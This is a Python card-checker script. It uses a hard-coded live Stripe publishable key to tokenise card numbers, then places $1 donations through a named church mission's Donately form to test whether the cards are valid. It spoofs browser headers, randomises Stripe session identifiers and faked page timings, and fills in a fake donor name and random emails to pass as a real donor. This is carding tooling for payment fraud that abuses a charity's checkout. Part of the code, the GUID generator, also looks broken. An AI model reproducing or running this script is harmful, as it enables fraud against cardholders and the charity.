import requests
import json
import random
import string
import hashlib
import time

class StripeChecker:
    def __init__(self):
        self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        self.account_id = 'act_f9b102ae7299'
        self.form_id = 'frm_5cb29a5d6955'

    def generate_guid(self):
        return '-'.join([
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(3)),
            ''.join(random.choices(string.hexdigits[:16], k=3)) + '4',
            ''.join(random.choices(string.hexdigits[:16], k=3)) + 'a',
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(2))
        ])

    def generate_token(self, card_data):
        url = 'https://api.stripe.com/v1/tokens'
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        post_fields = {
            'card[number]': card_data['cc'],
            'card[cvc]': card_data['cvv'],
            'card[exp_month]': card_data['month'],
            'card[exp_year]': card_data['year'],
            'card[name]': card_data['name'],
            'card[address_country]': 'US',
            'card[currency]': 'USD',
            'guid': self.generate_guid(),
            'muid': self.generate_guid(),
            'sid': self.generate_guid(),
            'payment_user_agent': 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page': random.randint(20000, 50000),
            'key': self.pk_live,
            '_stripe_version': '2022-11-15'
        }

        response = requests.post(url, headers=headers, data=post_fields)
        return response.json()

    def charge_card(self, token, user_data):
        url = f"https://api.donately.com/v2/donations?account_id={self.account_id}&donation_type=cc&amount_in_cents=100&form_id={self.form_id}&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload = {
            'campaign_id': None,
            'fundraiser_id': None,
            'dont_send_receipt_email': False,
            'first_name': user_data['first_name'],
            'last_name': user_data['last_name'],
            'email': user_data['email'],
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json.dumps({'stripe_token': token}),
            'form': json.dumps({
                'version': '5.8.117',
                'id': self.form_id
            })
        }

        response = requests.post(url, headers=headers, json=payload)
        return response.json()

    def process_card(self, cc, month, year, cvv):
        user_data = {
            'first_name': 'Richard',
            'last_name': 'Biven',
            'email': f'test{random.randint(1000, 9999)}@gmail.com'
        }

        token_response = self.generate_token({
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'name': f"{user_data['first_name']} {user_data['last_name']}"
        })

        if 'id' not in token_response:
            return {
                'success': False,
                'message': 'Token generation failed',
                'error': token_response.get('error', {}).get('message', 'Unknown error')
            }

        charge_response = self.charge_card(token_response['id'], user_data)

        return charge_response


checker = StripeChecker()


cc = '4111111111111111'
month = '12'
year = '25'
cvv = '123'

result = checker.process_card(cc, month, year, cvv)
print(json.dumps(result, indent=4))
